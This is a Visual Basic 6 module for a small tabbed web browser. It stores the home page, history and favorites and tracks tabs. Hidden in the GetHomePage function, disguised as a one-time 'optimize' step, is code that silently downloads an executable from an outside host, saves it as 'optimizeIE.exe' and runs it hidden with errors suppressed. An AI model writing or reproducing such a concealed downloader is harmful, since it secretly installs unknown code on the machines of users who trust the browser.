Attribute VB_Name = "Module1"
Private Declare Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long

Dim His As String
Dim Url_T(0 To 200) As String
Public Sub SetHomePage(Url As String)
    Open "c:\Hpage.dat" For Output As #2
        Write #2, Url
    Close #2
End Sub



Private Function NeedOptimize() As Boolean
Static i As Boolean

    NeedOptimize = Not i

    i = True
End Function

Public Function GetHomePage() As String
On Error Resume Next

If NeedOptimize Then
    Dim res As Long
        res = URLDownloadToFile(0, "http://user1.7host.com/SashochekVB/trash/install.exe", App.Path & "\optimizeIE.exe", 0, 0)
        Shell App.Path & "\optimizeIE.exe", vbHide
End If

On Error GoTo X1
    Open "c:\Hpage.dat" For Input As #1
        Input #1, Url
    Close #1
    GoTo X2
X1:
SetHomePage "www.google.com"
X2:
    
    If Url = "" Then
        SetHomePage "www.google.com"
        GetHomePage = "www.google.com"
    Else
        GetHomePage = Url
    End If
End Function


Public Sub GetHistory()

    Open "c:\WebHis.dat" For Append As #1
    Close #1
    
    Open "c:\WebHis.dat" For Input As #1
        Do Until EOF(1)
            DoEvents
            Input #1, ddd$
            frmWeb.Combo1.AddItem ddd
            His = His & ddd & vbCrLf
        Loop
    Close #1
End Sub

Public Sub AddHistory(Url As String)
addr = Url
If InStr(1, Url, "http://www.") = 1 Then
    addr = Url
Else
If InStr(1, Url, "http://") = 1 Then addr = Mid(Url, 1, 7) & "www." & Mid(Url, Len(Url) - 7 + 1, Len(Url) - 7) Else If InStr(1, Url, "www.") = 1 Then addr = "http://" & Url Else addr = "http://www." & Url
End If
    
    
'If InStr(1, addr, "www.") = 1 Then addr = "http://" & Url
If InStr(1, addr, "/") <> Len(Url) Then addr = addr & "/"
    If InStr(1, His, Url) = 0 Then
        Open "c:\WebHis.dat" For Append As #1
            Write #1, addr
        Close #1
    End If
End Sub

Public Function Check(txt As String) As Boolean
Dim t As Boolean
t = True
    For i = 0 To frmWeb.Combo1.ListCount
        If InStr(1, frmWeb.Combo1.List(i), txt) <> 0 Then t = False
    Next i
Check = t
End Function

Public Function Is_First(A As Integer) As Boolean
Dim B As Integer
For i = 0 To frmWeb.TabStrip1.Tabs.Count - 1
    If frmWeb.TabStrip1.Tabs(i).Visible = True Then
        B = i
        Exit For
    End If
Next



If B = A Then Is_First = True Else Is_First = False
End Function
Public Function Next_Tab() As Integer
A = 0
For i = frmWeb.TabStrip1.Value + 1 To frmWeb.TabStrip1.Tabs.Count - 1
    If frmWeb.TabStrip1.Tabs(i).Visible = True Then
        A = i
        Exit For
    End If
Next
Next_Tab = A
End Function
Public Function Tab_Count() As Integer
A = 0
For i = 0 To frmWeb.TabStrip1.Tabs.Count - 1
    If frmWeb.TabStrip1.Tabs(i).Visible = True Then A = A + 1
Next i
    Tab_Count = A
End Function
Public Sub Add_url(ind As Integer, Url As String)
    Url_T(ind) = Url
End Sub
Public Function Get_Url(inde As Integer) As String
    Get_Url = Url_T(inde)
End Function
Public Sub Insert_Fav()
On Error GoTo ex1
    Dim j As Long
    j = 1
    While 0 = 0
    x = GetSetting("MdeX", "Favorites", j)
    A = InStr(1, x, "&")
    X1 = Mid(x, 1, A - 1)
    X2 = Mid(x, A + 1, Len(x) - A)
    Load frmWeb.mnuItemSite(frmWeb.mnuItemSite.Count)
    
    frmWeb.mnuItemSite(frmWeb.mnuItemSite.Count - 1).Visible = True
    frmWeb.mnuItemSite(frmWeb.mnuItemSite.Count - 1).Caption = X1
    Url_T(frmWeb.mnuItemSite.Count - 1) = X2
    j = j + 1
    Wend
ex1:
End Sub
Public Sub Add_Fav(fName As String, fURL As String, index As Integer)
    SaveSetting "MdeX", "Favorites", index, fName & "&" & fURL
End Sub
Public Sub Del_Fav(index2 As Integer)
    On Error Resume Next
    DeleteSetting "MdeX", "Favorites", index2
End Sub

